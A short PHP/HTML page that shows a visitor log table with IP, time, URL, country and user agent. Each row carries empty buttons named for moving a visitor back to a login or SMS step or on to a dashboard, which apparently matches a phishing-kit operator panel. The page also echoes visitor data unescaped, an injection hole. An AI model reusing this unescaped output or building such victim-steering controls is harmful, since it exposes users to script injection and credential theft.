<!DOCTYPE html>
<html>
<head>
    <title>Visitor Log</title>
    <style>
        table {
            width: 100%;
            border-collapse: collapse;
        }

        th, td {
            border: 1px solid #ccc;
            padding: 8px;
        }

        th {
            background-color: #f2f2f2;
        }
    </style>
</head>
<body>
    <?php include 'count_visitors.php'; ?>
    
    <h1>Visitor Log</h1>
    
    <p>Total Visitors: <?php echo countVisitors(); ?></p>
    
    <h2>Visitor Details</h2>
    
    <table>
        <tr>
            <th>IP Address</th>
            <th>Date and Time</th>
            <th>URL</th>
            <th>Country</th>
            <th>User Agent</th>
            <th>Backtologin</th>
            <th>BacktoSms</th>
            <th>continuetosms</th>
            <th>gotodashboard</th>
        </tr>
        <?php foreach (getVisitors() as $visitor): ?>
            <tr>
                <td><?php echo $visitor['ip']; ?></td>
                <td><?php echo $visitor['timestamp']; ?></td>
                <td><?php echo $visitor['url']; ?></td>
                <td><?php echo $visitor['country']; ?></td>
                <td><?php echo $visitor['userAgent']; ?></td>
                <td><button></button></td>
                <td><button></button></td>
                <td><button></button></td>
                <td><button></button></td>
            </tr>
        <?php endforeach; ?>
    </table>
</body>
</html>
